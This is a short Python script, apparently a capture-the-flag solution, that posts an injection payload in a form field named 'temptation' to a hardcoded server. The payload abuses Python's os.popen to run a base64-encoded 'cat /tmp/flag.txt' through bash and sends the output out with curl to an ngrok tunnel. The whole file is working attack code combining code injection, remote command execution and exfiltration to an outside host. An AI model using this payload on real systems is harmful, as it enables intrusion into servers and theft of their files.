import requests
import re
import base64 

url = "http://52.59.124.14:5011/"
payload = "cat /tmp/flag.txt"
final_payload = "echo " +  base64.b64encode(payload.encode()).decode() + "| base64 -d |bash)').read()}"

data = {
    "temptation":"${__import__('os').popen('curl https://9791-2-37-206-147.ngrok-free.app?content=$(" + final_payload
}
requests.post(url, data=data)
